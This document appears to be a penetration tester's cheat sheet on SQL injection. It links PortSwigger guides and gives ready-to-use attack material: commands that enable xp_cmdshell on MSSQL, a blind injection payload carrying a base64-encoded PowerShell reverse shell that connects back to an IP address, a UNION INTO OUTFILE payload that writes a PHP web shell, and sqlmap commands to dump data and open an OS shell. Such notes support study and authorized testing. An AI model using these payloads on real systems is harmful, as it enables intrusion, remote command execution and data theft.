## SQL Injection
---
- [Port Swigger SQL Injection cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

## Blind SQL Injection
---
- [PortSwigger Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind)

## SQL Union Based Attacks
---
- [PortSwigger UNION Attacks](https://portswigger.net/web-security/sql-injection/blind)

## MSSQL Code Execution
---

In MSSQL thanks to the keyword execute, we can execute arbitrary command on the operating system below. To do that first we have to enable command execution inside the Database with

```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Then execute commands with

```sql
EXECUTE xp_cmdshell 'whoami'
```

Putting all togheter, we can have very fancy injections adding multiple tools.

### impacket-mssqlclient

We can use **impacket-mssqlclient** with **-windows-auth** as login method in the **MSSQL** Database

```shell
proxychains python3 /home/kali/.local/bin/mssqlclient.py -port 1433 domain.com/user:password@<IP> -windows-auth
```

## Blind Reverse Shell - SQL Injection
---

The following payload has been crafted with [https://www.revshells.com/](https://www.revshells.com/)

```sql
'; EXECUTE xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMAA4ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='; --
```

## Uploading a PHP Backdoor from SQL
---
n other database scenarios we can abuse the `SELECT INTO_OUTFILE` statement and we can try to upload something malicious in the webserver. We must have write permission in the folder we will write the file into.

```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

Next, with a simple GET request like `/tmp/cmd=whoami` we can execute commands on the webserver.

## SQLMAP
---

```shell
sqlmap  --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" -r request.txt --proxy http://127.0.0.1:8080 --dump

sqlmap  --user-agent="Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" -r request4.txt --proxy http://127.0.0.1:8080 --os-shell
```